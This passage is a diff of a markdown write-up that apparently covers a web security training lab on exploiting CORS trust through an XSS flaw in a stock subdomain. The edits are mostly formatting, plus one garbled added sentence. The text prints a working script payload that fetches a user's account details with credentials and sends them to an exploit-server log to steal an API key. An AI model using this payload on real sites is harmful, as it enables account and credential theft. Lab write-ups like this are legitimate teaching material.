@@ -228,13 +228,13 @@ So we know that we can issue cross-site request from a subdomain. Now we have to
 <br>![img](./img/57.png)<br>
 From the above image we can see that a call to the <b>stock subdomain</b> is performed to check the stock amount, then sending the request to the Repeater we can try to verify if the QS parameter are injectable:
 <br>![img](./img/58.png)<br>
-So the productId parameter is prone to XSS attacks, we can take advantages of this vulnerability to exploit the CORS security lack. First of all we will test if we are able to get the account details information for the current user from the vulnerable stock web page hosted in the lab subdomain. We will delivery the following payload to try to get the account details for our current logged user (we must use credentials: 'include' in the fetch request to pass the credentials).
+So the <b>productId</b> parameter is right to us, since  is prone to XSS attacks, we can take advantages of this vulnerability to exploit the CORS security lack. First of all, we will test if we are able to get the account details information for the current user, from the vulnerable stock web page hosted in the lab subdomain. We will delivery the following payload to try to get the account details for our current logged user (we must use credentials: 'include' in the fetch request to pass the credentials).
 <br>![img](./img/59.png)<br>
-Further we can see the response in the browser (right click in request section in the Repeater)
+Further we can see the response in the browser (right click in request section in the Repeater to get the URL)
 <br>![img](./img/60.png)<br>
 Finally we craft the payload to be included in the exploit server, we have to direct the flow to the vulnerable stock page first, then we redirect the response containing the account details to the exploit server in the query string:
 <br>![img](./img/61.png)<br>
-As shown in the image above I encoded in URL format the actual payload passed as productID parameter (highlighted), for your convenience this is the plain version:
+As shown in the image above I encoded in URL format the actual payload passed as <b>productID parameter</b> (highlighted), for your convenience this is the plain version:
 ```
 <script>
 fetch('https://0a6e004204f74b30c142e98100f9006b.web-security-academy.net/accountDetails', {credentials: 'include'})
@@ -242,11 +242,11 @@ fetch('https://0a6e004204f74b30c142e98100f9006b.web-security-academy.net/account
 .then((response) => document.location='https://exploit-0aa600e7048e4bcac12de85a010500dd.exploit-server.net/log?x='+response);</script>
 
 ```
-Once the explit is stored (1) we can verify if it works (2). As shown below we can see that the redirection to exploit server access log works and that the account details are trasmitted into the query string
+Once the explit is stored (1) we can verify if it works (2). As shown below, we can see that the redirection to exploit server access log works and that the account details are trasmitted into the query string
 <br>![img](./img/62.png)<br>
-Then we can delivery our payload to the victim and inspecting the access log we can see the account details (URL encoded) for the administrator user
+Then we can delivery our payload to the victim and inspecting the access log: we can see the account details (URL encoded) for the administrator user
 <br>![img](./img/63.png)<br>
-Decode the query string x parameter value to get the API key
+Decode the query string <b>x parameter</b> value to get the API key
 
 References:
 + https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Sec-Fetch-Mode
